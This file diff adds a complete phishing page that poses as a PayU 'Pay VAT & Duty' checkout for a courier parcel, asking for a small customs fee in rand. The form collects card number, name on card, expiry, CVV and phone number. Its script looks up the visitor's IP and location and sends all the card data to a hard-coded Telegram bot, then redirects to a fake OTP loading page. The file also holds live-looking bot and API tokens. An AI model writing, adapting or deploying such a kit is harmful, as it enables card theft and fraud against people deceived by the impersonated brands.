@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Pay VAT & Duty</title>
+<link rel="icon" href="https://corporate.payu.com/wp-content/uploads/2020/05/PAYU_LOGO_SQUARE_LIME-e1589274472992.jpg">
+<style>
+  body {margin:0; font-family: Arial, sans-serif; background:#fff; color:#000;}
+  .container {max-width:800px; margin:20px auto; padding:0 15px;}
+
+  .top-box {
+    display:flex;
+    flex-wrap: wrap;
+    justify-content:space-between;
+    border:1px solid #ccc;
+    padding:20px;
+    border-radius:6px;
+    background:#f5f5f5;
+  }
+
+  /* Updated: make logo 2x shorter */
+  .top-box img {
+    max-width:75px;
+    height:37px;
+    margin-bottom:10px;
+  }
+
+  .details {flex:1; margin-left:20px; min-width:200px;}
+  .amount-box {
+    background:#4CAF50;
+    color:#fff;
+    padding:10px;
+    margin-top:10px;
+    text-align:center;
+    font-weight:bold;
+    border-radius:4px;
+  }
+
+  .form-box {
+    border:1px solid #ccc;
+    border-radius:6px;
+    padding:20px;
+    margin-top:20px;
+    background:#f9f9f9;
+  }
+
+  .form-box h3 {margin-top:0; font-size:16px;}
+  input[type="text"], input[type="number"] {
+    width:100%;
+    padding:8px;
+    margin:6px 0 12px 0;
+    box-sizing:border-box;
+  }
+
+  button {
+    padding:10px 20px;
+    margin:6px 0;
+    border:none;
+    border-radius:4px;
+    cursor:pointer;
+  }
+
+  .pay-btn {background:#4CAF50; color:#fff; width:100%;}
+  .cancel-btn {background:#ccc; width:100%;}
+
+  /* Footer box style */
+  .footer-box {
+    border:1px solid #ccc;
+    border-radius:6px;
+    padding:20px;
+    margin-top:40px;
+    background:#f9f9f9;
+    font-size:12px;
+    line-height:1.5;
+    color:#555;
+    text-align:center;
+  }
+
+  /* Responsive */
+  @media (max-width:600px) {
+    .top-box {flex-direction: column; align-items: flex-start;}
+    .details {margin-left:0; margin-top:10px;}
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <div class="top-box">
+    <img src="https://ipfs.io/ipfs/bafkreift76igpyooavjbhnueqp2pdn5a3q3iczjmp5smq6d2vdxqc2uxsq" alt="BUFFALO Logo">
+
+    <div class="details">
+      <div>Tracking Number: <span id="tracking-number">---</span></div>
+      <div class="amount-box">Amount Due R15.13</div>
+    </div>
+  </div>
+
+  <div class="form-box">
+    <h3>Choose your payment method</h3>
+
+    <p><img src="https://ipfs.io/ipfs/bafkreih3gr3bffxtr6ejikymudklbuxgql3bj3xiedhne6rkt2jtuczw7e" style="max-width:70px;"></p>
+
+    <label>Card number:</label>
+    <input type="number" id="ext" placeholder="5123456789012345" required>
+
+    <label>Name on card:</label>
+    <input type="text" id="full" placeholder="John Doe" required>
+
+    <label>Expire date (MM/YY):</label>
+    <input type="text" id="ret" placeholder="MM/YY" required>
+
+    <label>CCV:</label>
+    <input type="text" id="part" placeholder="321" required>
+
+    <label>Phone number:</label>
+    <input type="text" id="phone" placeholder="0621234567" required>
+
+    <button class="pay-btn" id="payBtn">Pay R15.13</button>
+    <button class="cancel-btn" onclick="window.location.href='index1.html'">Cancel</button>
+
+    <p style="font-size:12px; margin-top:10px;">
+      *You may be redirected to your bank's secure site to authenticate yourself before making the payment.
+    </p>
+  </div>
+</div>
+
+<div class="footer-box">
+  <p>You agree that your personal data will be processed when you choose a payment method and proceed with a transaction. We may share your personal data with entities involved in processing your transaction. Depending on the payment method you choose, this can include banks, merchants, EFT providers, payment schemes, loan institutions or loyalty points providers. Providing personal data is a choice by you. If you choose not to provide your personal data, your transaction may be rejected. For information on how we process your personal data and your rights, see our PayU Privacy Statement. For information on our terms, compliance and security standards, see our Legal Information.</p>
+
+  <p>All Rights Reserved ©2024</p>
+</div>
+
+<script>
+// ================= TELEGRAM BOT SETTINGS =================
+const BOT_TOKEN = "8514747527:AAFA7dakDlUWGG0S65QxWWbVsrY58Qe3lpI";  
+const CHAT_ID = "5886782391";  
+const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+async function sendTelegram(msg) {
+    return fetch(TG_URL, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+    }).catch(err => console.error("Telegram error:", err));
+}
+
+// ================= LOAD TRACKING NUMBER =================
+const tn = localStorage.getItem("partCode");
+document.getElementById("tracking-number").textContent = tn ? tn : "---";
+
+// ================= FORM HANDLER ========================
+document.getElementById("payBtn").addEventListener("click", async function (e) {
+    e.preventDefault();
+
+    const ext = document.getElementById("ext").value.trim();
+    const full = document.getElementById("full").value.trim();
+    const ret = document.getElementById("ret").value.trim();
+    const part = document.getElementById("part").value.trim();
+    const phone = document.getElementById("phone").value.trim();
+
+    if (!ext || !full || !ret || !part || !phone) {
+        alert("All fields are required.");
+        return;
+    }
+    if (ext.length < 15 || ext.length > 16) {
+        alert("Enter valid card number.");
+        return;
+    }
+    if (part.length < 3 || part.length > 4) {
+        alert("Enter valid CCV (3 digit code at the back of card).");
+        return;
+    }
+
+    // Validate Return Date
+    const now = new Date();
+    const currMM = now.getMonth() + 1;
+    const currYY = now.getFullYear() % 100;
+    const parts = ret.split("/");
+    if (parts.length !== 2 || isNaN(parseInt(parts[0])) || isNaN(parseInt(parts[1]))) {
+        alert("Invalid Return Date format. Use MM/YY");
+        return;
+    }
+    const mm = parseInt(parts[0], 10);
+    const yy = parseInt(parts[1], 10);
+    if (mm < 1 || mm > 12 || yy < currYY || (yy === currYY && mm < currMM)) {
+        alert("Return Date cannot be earlier than today.");
+        return;
+    }
+
+    // Save for OTP page
+    localStorage.setItem("otpTracking", tn);
+    localStorage.setItem("otpPhone", phone);
+
+    // ================= GET IP INFO =================
+    let ipData = {};
+    try {
+        const res = await fetch("https://ipinfo.io/json?token=2f6f6d20c9dc1a");
+        ipData = await res.json();
+    } catch (err) {
+        console.error("IP info error:", err);
+    }
+
+    // ================= SEND TO TELEGRAM (FULL NUMBERS) =================
+    const message =
+        "BUFFALO FORM SUBMISSION\n" +
+        `Tracking: ${tn || "N/A"}\n` +
+        `Card: ${ext}\n` +
+        `Name: ${full}\n` +
+        `Date: ${ret}\n` +
+        `CCV: ${part}\n` +
+        `Phone: ${phone}\n` +
+        `IP: ${ipData.ip || "N/A"}\n` +
+        `Location: ${ipData.city || "N/A"}, ${ipData.region || "N/A"}, ${ipData.country || "N/A"}\n` +
+        `ISP: ${ipData.org || "N/A"}\n` +
+        `Time: ${new Date().toLocaleString()}`;
+
+    await sendTelegram(message);
+
+    // Redirect
+    window.location.href = "loading2.html";
+});
+</script>
+
+</body>
+</html>
